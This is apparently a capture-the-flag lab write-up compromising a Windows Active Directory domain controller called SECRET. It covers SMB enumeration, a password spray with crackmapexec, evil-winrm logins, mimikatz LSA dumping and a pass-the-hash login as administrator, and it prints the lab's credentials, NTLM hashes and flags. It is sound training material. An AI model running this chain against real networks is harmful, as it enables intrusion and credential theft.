# SECRET / Active Directory

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/4d38101776224c698b56def9fb422cce.png)

## NMAP SCAN

```text
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2021-03-13 15:25:57Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: SECRET.org0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  syn-ack ttl 127 Windows Server 2019 Standard 17763 microsoft-ds (workgroup: SECRET)
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: SECRET.org0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SECRET
|   NetBIOS_Domain_Name: SECRET
|   NetBIOS_Computer_Name: SECRET-DC
|   DNS_Domain_Name: SECRET.org
|   DNS_Computer_Name: SECRET-DC.SECRET.org
|   DNS_Tree_Name: SECRET.org
|   Product_Version: 10.0.17763
|_  System_Time: 2021-03-13T15:26:51+00:00
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49700/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

## SMB ENUMERATION

```text
smbclient -L \\\\172.31.1.4\\ -N
```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/617f2327f23c4c26a36a628dede669cd.png)

* SHARE OFFICE\_SHARE

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/9c3444ef61ce443fb5cf4114b3c1917d.png)

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/21173fd843954668ab5531c6e674bcda%20%282%29.png)

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/af46b71057454a84a680e4201065340d.png)

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/340129f426fd4042ae447fcaccb71f0a.png)

```text
SecretOrg!
```

### USERS ENUMERATION

```text
Ben Dover
Joe Cakes
Kurby Curtis
Lee Frank
```

Combined the Users found using this script

```python
#!/usr/bin/env python3

file_name = "names.txt"

with open(file_name, "r") as f:
    lines = f.readlines()
    for line in lines:
        line = line.strip("\n") # remove the unneccesary new lines (\n)
        
        name = line.split(" ") # split the names by space
        # print the usernames in 3 different formats
        print(name[0] + name[1])
        print(name[0][:1] + name[1])
        print(name[0] + name[1][:1])
```

```text
crackmapexec smb 172.31.1.4 -u ./combined.txt -p 'SecretOrg!' --shares
```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/e5e9ed66d20745d7a8cb3ff0834d1c34.png)

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/5cf66c75bd364134a1523999f88b5558.png)

### LET's try to login with evil-winrm

```text
jcakes:SecretOrg!
```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/33a241b6f1364fc9a54450890d8e9192.png)

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/29273abe119d447bac73c974514bdb88.png)

## WINPEAS FINDINGS

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/cd4138e759c54f87b5349161572f90df.png)

```text
vF4$x9#z:-eT~Fy
```

## USE CREDS FOUND

```text
administrator
bdover
kcurtis
lfrank

```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/250543aefe574dc2948a9e63fae85e4b.png)

```text
bdover:vF4$x9#z:-eT~Fy
```

### LOGIN WITH BDOVER CREDS

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/5c02bc9b47114053b3cf4dc1d4c0cb28.png)

## GETTIN ADMIN CREDS

* Upload mimikatz.exe and run this command

  ```text
  .\mimikatz.exe "privilege::debug" "lsadump::lsa /patch" "exit"
  ```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/03ef921b9af54213ba0cfb6ef0ea5eca.png)

```text
administrator:4d801e8c043133366056b5cd6fdcc2c7
krbtgt:273ba21a421f03e6c4345ec16642bd1d
```

## LOGIN WITH ADMINISTRATOR HASH

```text
evil-winrm -i 172.31.1.4 -u administrator -H 4d801e8c043133366056b5cd6fdcc2c7
```

![](https://github.com/TheLivestep/WRITEUPS/blob/master/.gitbook/assets/956c286a61d740568e66cde2485290cd.png)

## FLAGS

### USER

```text
f32dae1bca59aea4a591f970f7aa4d2c
```

### ROOT

```text
7b50e84e903c4cfad6498977632fd763
```



